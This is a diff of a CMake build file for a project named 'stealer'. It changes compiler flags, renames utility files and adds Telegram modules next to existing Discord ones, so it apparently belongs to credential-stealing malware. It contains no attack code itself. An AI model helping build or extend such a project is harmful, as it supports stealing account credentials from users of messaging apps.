@@ -2,8 +2,8 @@ cmake_minimum_required(VERSION 3.28)
 project(stealer)
 
 set(CMAKE_CXX_STANDARD 20)
-set(CMAKE_C_FLAGS "${CMAKE_C_FLAGS} -msse4.1")
-set(CMAKE_CXX_FLAGS "${CMAKE_CXX_FLAGS} -msse4.1")
+set(CMAKE_C_FLAGS "${CMAKE_C_FLAGS} -mssse3")
+set(CMAKE_CXX_FLAGS "${CMAKE_CXX_FLAGS} -mssse3")
 
 
 add_definitions(-DDEV=true)
@@ -29,10 +29,12 @@ add_executable(stealer src/main.cpp
         src/stealer/impl/socials/impl/Discord.cpp
         src/stealer/impl/socials/impl/Discord.h
         include/json.hpp
-        src/utils/StringUtils.cpp
-        src/utils/StringUtils.h
-        src/utils/HttpUtils.cpp
-        src/utils/HttpUtils.h
+        src/utils/StringUtil.cpp
+        src/utils/StringUtil.h
+        src/utils/HttpUtil.cpp
+        src/utils/HttpUtil.h
+        src/stealer/impl/socials/impl/Telegram.cpp
+        src/stealer/impl/socials/impl/Telegram.h
 )
 
 target_link_libraries(stealer
